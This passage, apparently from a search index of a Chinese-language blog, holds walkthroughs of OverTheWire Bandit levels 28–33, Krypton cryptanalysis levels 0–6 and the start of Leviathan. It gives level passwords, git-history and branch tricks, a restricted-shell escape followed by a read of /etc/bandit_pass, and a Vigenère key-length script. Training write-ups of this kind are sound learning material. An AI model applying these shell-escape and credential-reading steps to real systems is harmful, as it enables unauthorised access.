clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo Cloning into 'repo'... The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit27/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit27-git@localhost's password: remote: Enumerating objects: 3, done. remote: Counting objects: 100% (3/3), done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (3/3), done. bandit27@bandit:/tmp/a$ ll total 10564 drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ./ drwxrwx-wt 317 root root 10801152 Jul 19 02:08 ../ drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 repo/ bandit27@bandit:/tmp/a$ cd repo/ bandit27@bandit:/tmp/a/repo$ ll total 16 drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ./ drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ../ drwxrwxr-x 8 bandit27 bandit27 4096 Jul 19 02:08 .git/ -rw-rw-r-- 1 bandit27 bandit27 68 Jul 19 02:08 README bandit27@bandit:/tmp/a/repo$ cat README The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR bandit27@bandit:/tmp/a/repo$","title":"level28"},{"location":"en/WarGame/bandit/#level29","text":"\u8fd8\u662f\u8001\u89c4\u77e9 bandit28@bandit:/tmp/b$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo Cloning into 'repo'... The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit28/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit28-git@localhost's password: remote: Enumerating objects: 9, done. remote: Counting objects: 100% (9/9), done. remote: Compressing objects: 100% (6/6), done. remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (9/9), done. Resolving deltas: 100% (2/2), done. bandit28@bandit:/tmp/b$ cd repo/ bandit28@bandit:/tmp/b/repo$ ll total 16 drwxrwxr-x 3 bandit28 bandit28 4096 Jul 19 02:11 ./ drwxrwxr-x 3 bandit28 bandit28 4096 Jul 19 02:11 ../ drwxrwxr-x 8 bandit28 bandit28 4096 Jul 19 02:11 .git/ -rw-rw-r-- 1 bandit28 bandit28 111 Jul 19 02:11 README.md bandit28@bandit:/tmp/b/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: xxxxxxxxxx bandit28@bandit:/tmp/b/repo$ git log commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -> master, origin/master, origin/HEAD) Author: Morla Porla <morla@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 fix info leak commit abcff758fa6343a0d002a1c0add1ad8c71b88534 Author: Morla Porla <morla@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 add missing data commit c0a8c3cf093fba65f4ee0e1fe2a530b799508c78 Author: Ben Dover <noone@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 initial commit of README.md \u8fd9\u662f\u5178\u578b\u7684git\u6cc4\u9732 bandit28@bandit:/tmp/b/repo$ git diff 899b abcf diff --git a/README.md b/README.md index 5c6457b..b302105 100644 --- a/README.md +++ b/README.md @@ -4,5 +4,5 @@ Some notes for level29 of bandit. ## credentials - username: bandit29 -- password: xxxxxxxxxx +- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S bandit28@bandit:/tmp/b/repo$","title":"level29"},{"location":"en/WarGame/bandit/#level30","text":"\u4e0b\u8f7d\u4e0b\u6765\u4ee5\u540e\uff0c\u4e00\u5f00\u59cb\u4ee5\u4e3a\u662fstash\uff0c\u7136\u540e\u53d1\u73b0\u4e0d\u662f\uff0c\u90a3\u4e48\u67e5\u770b\u522b\u7684\u5206\u652f\u3002 bandit29@bandit:/tmp/c/repo$ git stash list bandit29@bandit:/tmp/c/repo$ git branch -a * master remotes/origin/HEAD -> origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev bandit29@bandit:/tmp/c/repo$ \u7136\u540e\u5207\u6362\u5206\u652f\u5373\u53ef bandit29@bandit:/tmp/c/repo$ git checkout dev Branch 'dev' set up to track remote branch 'dev' from 'origin'. Switched to a new branch 'dev' bandit29@bandit:/tmp/c/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS bandit29@bandit:/tmp/c/repo$","title":"level30"},{"location":"en/WarGame/bandit/#level31","text":"\u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u4e86\u4e00\u4e0b\u7f51\u4e0a\u7684\u7b54\u6848\uff0c\u8fd9\u73a9\u610f\u513f\u53eb\u5f15\u7528\uff0c\u8fd9\u91cc\u662f Git Pro\u6559\u7a0b bandit30@bandit:/tmp/d/repo$ git show-ref 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/heads/master 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/remotes/origin/HEAD 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/remotes/origin/master 831aac2e2341f009e40e46392a4f5dd318483019 refs/tags/secret bandit30@bandit:/tmp/d/repo$ git show 831a OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt bandit30@bandit:/tmp/d/repo$","title":"level31"},{"location":"en/WarGame/bandit/#level32","text":"push\u6587\u4ef6 bandit31@bandit:/tmp/d/repo$ git add -f ./key.txt bandit31@bandit:/tmp/d/repo$ git commit -m \"add key.txt\" [master 462b8a5] add key.txt 1 file changed, 1 insertion(+) create mode 100644 key.txt bandit31@bandit:/tmp/d/repo$ git push The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit31/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: Enumerating objects: 4, done. Counting objects: 100% (4/4), done. Delta compression using up to 2 threads Compressing objects: 100% (2/2), done. Writing objects: 100% (3/3), 324 bytes | 324.00 KiB/s, done. Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost:2220/home/bandit31-git/repo ! [remote rejected] master -> master (pre-receive hook declined) error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo' bandit31@bandit:/tmp/d/repo$","title":"level32"},{"location":"en/WarGame/bandit/#level33","text":"\u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u7684 \u7b54\u6848 >> $0 $ cat /etc/bandit_pass/bandit33 odHo63fHiFqcWWJG9rLiLDtPm45KzUKy","title":"level33"},{"location":"en/WarGame/bandit/#_1","text":"bandit33@bandit:~$ cat README.txt Congratulations on solving the last level of this game! At this moment, there are no more levels to play in this game. However, we are constantly working on new levels and will most likely expand this game with more levels soon. Keep an eye out for an announcement on our usual communication channels! In the meantime, you could play some of our other wargames. If you have an idea for an awesome new level, please let us know! bandit33@bandit:~$ \u5b8c\u7ed3\u6492\u82b1","title":"\u5f69\u86cb\u4e86"},{"location":"en/WarGame/krypton/","text":"level0 base64\u89e3\u7801 S1JZUFRPTklTR1JFQVQ= | | \\|/ KRYPTONISGREAT level1 \u5dee\u70b9\u513f\u6ca1\u627e\u7740\u6587\u4ef6\uff0c\u771f\u62bd\u8c61\u3002 krypton1@bandit:/krypton/krypton1$ ll total 16 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 8 root root 4096 Apr 23 18:05 ../ -rw-r----- 1 krypton1 krypton1 26 Apr 23 18:05 krypton2 -rw-r----- 1 krypton1 krypton1 882 Apr 23 18:05 README krypton1@bandit:/krypton/krypton1$ cat README Welcome to Krypton! This game is intended to give hands on experience with cryptography and cryptanalysis. The levels progress from classic ciphers, to modern, easy to harder. Although there are excellent public tools, like cryptool,to perform the simple analysis, we strongly encourage you to try and do these without them for now. We will use them in later excercises. ** Please try these levels without cryptool first ** The first level is easy. The password for level 2 is in the file 'krypton2'. It is 'encrypted' using a simple rotation called ROT13. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy! krypton1@bandit:/krypton/krypton1$ cat krypton2 | tr [A-Z] [N-ZA-M] LEVEL TWO PASSWORD ROTTEN krypton1@bandit:/krypton/krypton1$ \u5c31\u4e00\u4e2a\u79fb\u4f4d\u5bc6\u7801 level2 \u8fd8\u662f\u4e00\u4e2a\u79fb\u4f4d\u5bc6\u7801 krypton2@bandit:/tmp/krypton2$ cat /etc/issue Ubuntu 22.04.2 LTS \\n \\l krypton2@bandit:/tmp/krypton2$ /krypton/krypton2/encrypt /etc/issue krypton2@bandit:/tmp/krypton2$ cat ciphertext GNGZFGXFEZXkrypton2@bandit:/tmp/krypton2$ \u56e0\u6b64 krypton2@bandit:/tmp/krypton2$ cat /krypton/krypton2/krypton3 | tr [A-Z] [O-ZA-N] CAESARISEASY krypton2@bandit:/tmp/krypton2$ level3 \u63d0\u793a\u662f\u7edf\u8ba1\uff0c\u90a3\u5c31\u77e5\u9053\u4e86 krypton3@bandit:/krypton/krypton3$ cat found{1..3} | tr -cd '[:alpha:]' | fold -w1 | sort | uniq -c | sort -nr 456 S 340 Q 301 J 257 U 246 B 240 N 227 G 227 C 210 D 132 Z 130 V 129 W 86 M 84 Y 75 T 71 X 67 K 64 E 60 L 55 A 28 F 19 I 12 O 4 R 4 H 2 P \u7136\u540e\u8fd9\u513f\u6709\u4e2a\u8fd9\u73a9\u610f\uff0c\u5927\u6982\u80fd\u770b\u51fa\u6765 \u4f46\u662f\u4e0d\u5b8c\u5168\u51c6\uff0c\u6765\u56de\u8bd5\u8bd5\u57fa\u672c\u4e0a\u5c31\u53ef\u4ee5\u4e86 krypton3@bandit:/krypton/krypton3$ cat krypton4 | tr 'KSVWBDGIXMNYQUCAJ' 'WELDOHNVFURPASIBT' WELLD ONETH ELELE LFOUP RASSW OPDIS XPUTE krypton3@bandit:/krypton/krypton3$ \u6bd4\u5982\u8bf4\u4f60\u731ckrypton\u91cc\u9762\u6709password\uff0c\u7136\u540e\u731c\u4e00\u4e0b\u5c31\u884c\u3002 level4 \u76f4\u63a5\u770bwp\u4e86\u53cd\u6b63\u662f\u3002\u3002\u3002 cleartext \u8fd9\u91cc\u6709\u4e2a\u7834\u89e3\u8fd9\u79cd\u5bc6\u7801\u7684 \u4e2d\u6587\u53c2\u8003 \uff0c\u53ef\u4ee5\u770b\u4e00\u770b level5 \u8fd9\u56de\uff0c\u641c\u4e86\u4e2a\u811a\u672c\u513f\u3002\u3002\u3002 \u81ea\u5df1\u5199\u662f\u771f\u4e0d\u4f1a\u3002\u3002\u3002 \u5f53\u7136\uff0c\u9996\u5148\u9700\u8981\u4e00\u70b9\u70b9\u5c0f\u7684\u547d\u4ee4 cat /krypton/krypton5/found{1..3} | tr -d '[:space:]' > output.txt \u7136\u540e\u8dd1\u811a\u672c ref1 REF2 import string # \u52a0\u8f7d\u5bc6\u6587 with open('output.txt', 'r') as f: cipher = f.read() #coding=utf-8 #-*- coding:utf-8 \u2013*- def c_alpha(cipher): # \u53bb\u6389\u975e\u5b57\u6bcd\u540e\u7684\u5bc6\u6587 cipher_alpha = '' for i in range(len(cipher)): if (cipher[i].isalpha()): cipher_alpha += cipher[i] return cipher_alpha # \u8ba1\u7b97cipher\u7684\u91cd\u5408\u6307\u6570 def count_CI(cipher): N = [0.0 for i in range(26)] cipher = c_alpha(cipher) L = len(cipher) if cipher == '': return 0 else: for i in range(L): #\u8ba1\u7b97\u6240\u6709\u5b57\u6bcd\u7684\u9891\u6570\uff0c\u5b58\u5728\u6570\u7ec4N\u5f53\u4e2d if (cipher[i].islower()): N[ord(cipher[i]) - ord('a')] += 1 else: N[ord(cipher[i]) - ord('A')] += 1 CI_1 = 0 for i in range(26): CI_1 += ((N[i] / L) * ((N[i]-1) / (L-1))) return CI_1 # \u8ba1\u7b97\u79d8\u94a5\u957f\u5ea6\u4e3a key_len \u7684\u91cd\u5408\u6307\u6570 def count_key_len_CI(cipher,key_len): un_cip = ['' for i in range(key_len)] # un_cip \u662f\u5206\u7ec4 aver_CI = 0.0 count = 0 for i in range(len(cipher_alpha)): z = i % key_len un_cip[z] += cipher_alpha[i] for i in range(key_len): un_cip[i]= count_CI(un_cip[i]) aver_CI += un_cip[i] aver_CI = aver_CI/len(un_cip) return aver_CI ## \u627e\u51fa\u6700\u53ef\u80fd\u7684\u524d\u5341\u4e2a\u79d8\u94a5\u957f\u5ea6 def pre_10(cipher): M = [(1,count_CI(cipher))]+[(0,0.0) for i in range(49)] for i in range(2,50): M[i] = (i,abs(0.065 - count_key_len_CI(cipher,i))) M = sorted(M,key = lambda x:x[1]) #\u6309\u7167\u6570\u7ec4\u7b2c\u4e8c\u4e2a\u5143\u7d20\u6392\u5e8f for i in range(1,10): print (M[i]) F = [ 0.0651738, 0.0124248, 0.0217339, 0.0349835, 0.1041442, 0.0197881, 0.0158610, 0.0492888, 0.0558094, 0.0009033, 0.0050529, 0.0331490, 0.0202124, 0.0564513, 0.0596302, 0.0137645, 0.0008606, 0.0497563, 0.0515760, 0.0729357, 0.0225134, 0.0082903, 0.0171272, 0.0013692, 0.0145984, 0.0007836 ] # \u82f1\u6587\u5b57\u7b26\u9891\u7387\u3002 cipher_alpha = c_alpha(cipher) print (\"\u79d8\u94a5\u957f\u5ea6\u4e3a:\") pre_10(cipher) \u7136\u540e\u6709\u5982\u4e0b\u8f93\u51fa\uff1a krypton5@bandit:/tmp/krypton5$ python3 test.py \u79d8\u94a5\u957f\u5ea6\u4e3a: (9, 0.017139818147855056) (36, 0.017203685000228598) (18, 0.01721992202177322) (27, 0.017472532653033286) (45, 0.0176209079041227) (33, 0.020346335439459143) (48, 0.020422875620895405) (24, 0.020464673333004946) (30, 0.02051347672724485) \u8fd9\u4e2a\u4e5f\u770b\u4e86\u4e00\u4e0bwp\uff0c\u4e5d\u4f4d\u5bc6\u7801\u662f\u51c6\u7684\uff0c\u4f46\u662f\u7a0b\u5e8f\u8f93\u51fa\u7684\u5bc6\u94a5\u4e0d\u51c6\uff0c\u4e0d\u77e5\u4e3a\u4ec0\u4e48\u3002 \u5bc6\u94a5\u662f keylength, \u7b54\u6848\u662f RANDOM level6 \u8fd9\u4e2a\u8fd8\u662f\u90a3\u4e2a\u7ef4\u5409\u5c3c\u4e9a\u7684\u53d8\u5f62\uff0c\u6ca1\u6709\u592a\u96be\u3002 ciphertext = 'PNUKLYLWRQKGKBE' key = 'EICTDGYIYZKTHNSIRFXYCPFUEOCKRN' for c, k in zip(ciphertext, key): p = ord('A') + ((ord(c) - ord(k)) % 26) print(chr(p), end='') print() \u6700\u540e\u5bc6\u7801\u5982\u4e0b LFSRISNOTRANDOM ref \u8fd9\u4e9b\u4e1c\u897f\u611f\u89c9\u77e5\u9053\u539f\u7406\u5c31\u5dee\u4e0d\u591a\u4e86\uff0c\u81ea\u5df1\u5199\u5b9e\u5728\u662f\u6ca1\u610f\u601d\u800c\u4e14\u6709\u4e9b\u56f0\u96be\u3002 \u4e5f\u6709\u4e0d\u5c11\u4eba\u5199\u811a\u672c\u5206\u6790\uff0c\u4f46\u662f\u611f\u89c9\u90a3\u4e9b\u811a\u672c\u5206\u6790\u51fa\u6765\u7684\u4e5f\u4e0d\u662f\u5f88\u51c6\uff0c\u8fd8\u662f\u9700\u8981\u4eba\u5de5\u6765\u770b\uff0c\u53cd\u6b63\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u641c\u641c\u3002 \u53bb\u7f51\u4e0a\u770b\u4e86\u770b\u53d1\u73b0\u522b\u4eba\u4e5f\u662f\u7528\u5de5\u5177\uff0c\u81ea\u5df1\u5206\u6790\u771f\u662f\u8fc7\u4e8e\u65e0\u804a\u4e86\u3002 ref3","title":"krypton"},{"location":"en/WarGame/krypton/#level0","text":"base64\u89e3\u7801 S1JZUFRPTklTR1JFQVQ= | | \\|/ KRYPTONISGREAT","title":"level0"},{"location":"en/WarGame/krypton/#level1","text":"\u5dee\u70b9\u513f\u6ca1\u627e\u7740\u6587\u4ef6\uff0c\u771f\u62bd\u8c61\u3002 krypton1@bandit:/krypton/krypton1$ ll total 16 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 8 root root 4096 Apr 23 18:05 ../ -rw-r----- 1 krypton1 krypton1 26 Apr 23 18:05 krypton2 -rw-r----- 1 krypton1 krypton1 882 Apr 23 18:05 README krypton1@bandit:/krypton/krypton1$ cat README Welcome to Krypton! This game is intended to give hands on experience with cryptography and cryptanalysis. The levels progress from classic ciphers, to modern, easy to harder. Although there are excellent public tools, like cryptool,to perform the simple analysis, we strongly encourage you to try and do these without them for now. We will use them in later excercises. ** Please try these levels without cryptool first ** The first level is easy. The password for level 2 is in the file 'krypton2'. It is 'encrypted' using a simple rotation called ROT13. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy! krypton1@bandit:/krypton/krypton1$ cat krypton2 | tr [A-Z] [N-ZA-M] LEVEL TWO PASSWORD ROTTEN krypton1@bandit:/krypton/krypton1$ \u5c31\u4e00\u4e2a\u79fb\u4f4d\u5bc6\u7801","title":"level1"},{"location":"en/WarGame/krypton/#level2","text":"\u8fd8\u662f\u4e00\u4e2a\u79fb\u4f4d\u5bc6\u7801 krypton2@bandit:/tmp/krypton2$ cat /etc/issue Ubuntu 22.04.2 LTS \\n \\l krypton2@bandit:/tmp/krypton2$ /krypton/krypton2/encrypt /etc/issue krypton2@bandit:/tmp/krypton2$ cat ciphertext GNGZFGXFEZXkrypton2@bandit:/tmp/krypton2$ \u56e0\u6b64 krypton2@bandit:/tmp/krypton2$ cat /krypton/krypton2/krypton3 | tr [A-Z] [O-ZA-N] CAESARISEASY krypton2@bandit:/tmp/krypton2$","title":"level2"},{"location":"en/WarGame/krypton/#level3","text":"\u63d0\u793a\u662f\u7edf\u8ba1\uff0c\u90a3\u5c31\u77e5\u9053\u4e86 krypton3@bandit:/krypton/krypton3$ cat found{1..3} | tr -cd '[:alpha:]' | fold -w1 | sort | uniq -c | sort -nr 456 S 340 Q 301 J 257 U 246 B 240 N 227 G 227 C 210 D 132 Z 130 V 129 W 86 M 84 Y 75 T 71 X 67 K 64 E 60 L 55 A 28 F 19 I 12 O 4 R 4 H 2 P \u7136\u540e\u8fd9\u513f\u6709\u4e2a\u8fd9\u73a9\u610f\uff0c\u5927\u6982\u80fd\u770b\u51fa\u6765 \u4f46\u662f\u4e0d\u5b8c\u5168\u51c6\uff0c\u6765\u56de\u8bd5\u8bd5\u57fa\u672c\u4e0a\u5c31\u53ef\u4ee5\u4e86 krypton3@bandit:/krypton/krypton3$ cat krypton4 | tr 'KSVWBDGIXMNYQUCAJ' 'WELDOHNVFURPASIBT' WELLD ONETH ELELE LFOUP RASSW OPDIS XPUTE krypton3@bandit:/krypton/krypton3$ \u6bd4\u5982\u8bf4\u4f60\u731ckrypton\u91cc\u9762\u6709password\uff0c\u7136\u540e\u731c\u4e00\u4e0b\u5c31\u884c\u3002","title":"level3"},{"location":"en/WarGame/krypton/#level4","text":"\u76f4\u63a5\u770bwp\u4e86\u53cd\u6b63\u662f\u3002\u3002\u3002 cleartext \u8fd9\u91cc\u6709\u4e2a\u7834\u89e3\u8fd9\u79cd\u5bc6\u7801\u7684 \u4e2d\u6587\u53c2\u8003 \uff0c\u53ef\u4ee5\u770b\u4e00\u770b","title":"level4"},{"location":"en/WarGame/krypton/#level5","text":"\u8fd9\u56de\uff0c\u641c\u4e86\u4e2a\u811a\u672c\u513f\u3002\u3002\u3002 \u81ea\u5df1\u5199\u662f\u771f\u4e0d\u4f1a\u3002\u3002\u3002 \u5f53\u7136\uff0c\u9996\u5148\u9700\u8981\u4e00\u70b9\u70b9\u5c0f\u7684\u547d\u4ee4 cat /krypton/krypton5/found{1..3} | tr -d '[:space:]' > output.txt \u7136\u540e\u8dd1\u811a\u672c ref1 REF2 import string # \u52a0\u8f7d\u5bc6\u6587 with open('output.txt', 'r') as f: cipher = f.read() #coding=utf-8 #-*- coding:utf-8 \u2013*- def c_alpha(cipher): # \u53bb\u6389\u975e\u5b57\u6bcd\u540e\u7684\u5bc6\u6587 cipher_alpha = '' for i in range(len(cipher)): if (cipher[i].isalpha()): cipher_alpha += cipher[i] return cipher_alpha # \u8ba1\u7b97cipher\u7684\u91cd\u5408\u6307\u6570 def count_CI(cipher): N = [0.0 for i in range(26)] cipher = c_alpha(cipher) L = len(cipher) if cipher == '': return 0 else: for i in range(L): #\u8ba1\u7b97\u6240\u6709\u5b57\u6bcd\u7684\u9891\u6570\uff0c\u5b58\u5728\u6570\u7ec4N\u5f53\u4e2d if (cipher[i].islower()): N[ord(cipher[i]) - ord('a')] += 1 else: N[ord(cipher[i]) - ord('A')] += 1 CI_1 = 0 for i in range(26): CI_1 += ((N[i] / L) * ((N[i]-1) / (L-1))) return CI_1 # \u8ba1\u7b97\u79d8\u94a5\u957f\u5ea6\u4e3a key_len \u7684\u91cd\u5408\u6307\u6570 def count_key_len_CI(cipher,key_len): un_cip = ['' for i in range(key_len)] # un_cip \u662f\u5206\u7ec4 aver_CI = 0.0 count = 0 for i in range(len(cipher_alpha)): z = i % key_len un_cip[z] += cipher_alpha[i] for i in range(key_len): un_cip[i]= count_CI(un_cip[i]) aver_CI += un_cip[i] aver_CI = aver_CI/len(un_cip) return aver_CI ## \u627e\u51fa\u6700\u53ef\u80fd\u7684\u524d\u5341\u4e2a\u79d8\u94a5\u957f\u5ea6 def pre_10(cipher): M = [(1,count_CI(cipher))]+[(0,0.0) for i in range(49)] for i in range(2,50): M[i] = (i,abs(0.065 - count_key_len_CI(cipher,i))) M = sorted(M,key = lambda x:x[1]) #\u6309\u7167\u6570\u7ec4\u7b2c\u4e8c\u4e2a\u5143\u7d20\u6392\u5e8f for i in range(1,10): print (M[i]) F = [ 0.0651738, 0.0124248, 0.0217339, 0.0349835, 0.1041442, 0.0197881, 0.0158610, 0.0492888, 0.0558094, 0.0009033, 0.0050529, 0.0331490, 0.0202124, 0.0564513, 0.0596302, 0.0137645, 0.0008606, 0.0497563, 0.0515760, 0.0729357, 0.0225134, 0.0082903, 0.0171272, 0.0013692, 0.0145984, 0.0007836 ] # \u82f1\u6587\u5b57\u7b26\u9891\u7387\u3002 cipher_alpha = c_alpha(cipher) print (\"\u79d8\u94a5\u957f\u5ea6\u4e3a:\") pre_10(cipher) \u7136\u540e\u6709\u5982\u4e0b\u8f93\u51fa\uff1a krypton5@bandit:/tmp/krypton5$ python3 test.py \u79d8\u94a5\u957f\u5ea6\u4e3a: (9, 0.017139818147855056) (36, 0.017203685000228598) (18, 0.01721992202177322) (27, 0.017472532653033286) (45, 0.0176209079041227) (33, 0.020346335439459143) (48, 0.020422875620895405) (24, 0.020464673333004946) (30, 0.02051347672724485) \u8fd9\u4e2a\u4e5f\u770b\u4e86\u4e00\u4e0bwp\uff0c\u4e5d\u4f4d\u5bc6\u7801\u662f\u51c6\u7684\uff0c\u4f46\u662f\u7a0b\u5e8f\u8f93\u51fa\u7684\u5bc6\u94a5\u4e0d\u51c6\uff0c\u4e0d\u77e5\u4e3a\u4ec0\u4e48\u3002 \u5bc6\u94a5\u662f keylength, \u7b54\u6848\u662f RANDOM","title":"level5"},{"location":"en/WarGame/krypton/#level6","text":"\u8fd9\u4e2a\u8fd8\u662f\u90a3\u4e2a\u7ef4\u5409\u5c3c\u4e9a\u7684\u53d8\u5f62\uff0c\u6ca1\u6709\u592a\u96be\u3002 ciphertext = 'PNUKLYLWRQKGKBE' key = 'EICTDGYIYZKTHNSIRFXYCPFUEOCKRN' for c, k in zip(ciphertext, key): p = ord('A') + ((ord(c) - ord(k)) % 26) print(chr(p), end='') print() \u6700\u540e\u5bc6\u7801\u5982\u4e0b LFSRISNOTRANDOM","title":"level6"},{"location":"en/WarGame/krypton/#ref","text":"\u8fd9\u4e9b\u4e1c\u897f\u611f\u89c9\u77e5\u9053\u539f\u7406\u5c31\u5dee\u4e0d\u591a\u4e86\uff0c\u81ea\u5df1\u5199\u5b9e\u5728\u662f\u6ca1\u610f\u601d\u800c\u4e14\u6709\u4e9b\u56f0\u96be\u3002 \u4e5f\u6709\u4e0d\u5c11\u4eba\u5199\u811a\u672c\u5206\u6790\uff0c\u4f46\u662f\u611f\u89c9\u90a3\u4e9b\u811a\u672c\u5206\u6790\u51fa\u6765\u7684\u4e5f\u4e0d\u662f\u5f88\u51c6\uff0c\u8fd8\u662f\u9700\u8981\u4eba\u5de5\u6765\u770b\uff0c\u53cd\u6b63\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u641c\u641c\u3002 \u53bb\u7f51\u4e0a\u770b\u4e86\u770b\u53d1\u73b0\u522b\u4eba\u4e5f\u662f\u7528\u5de5\u5177\uff0c\u81ea\u5df1\u5206\u6790\u771f\u662f\u8fc7\u4e8e\u65e0\u804a\u4e86\u3002 ref3","title":"ref"},{"location":"en/WarGame/leviathan/","text":"level0 ssh\u767b\u5f55\uff0c\u8001\u4e09\u6837\u4e86 \u250c\u2500\ud83c\udf35[myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[11:00:33]$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223 The authenticity of host '[leviathan.labs.overthewire.org]:2223 ([16.16.148.221]:2223)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:6: [hashed name] ~/.ssh/known_hosts:9: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '[leviathan.labs.overthewire.org]:2223' (ED25519) to the list of known hosts. _ _ _ _ | | _____ _(_) __ _| |_| |__ __ _ _ __ | |/ _ \\ \\ / / |/ _` | __| '_ \\ / _` | '_ \\ | | __/\\ V /| | (_| | |_| | | | (_| | | | | |_|\\___| \\_/ |_|\\__,_|\\__|_| |_|\\__,_|_| |_| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames leviathan0@leviathan.labs.overthewire.org's password: ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in 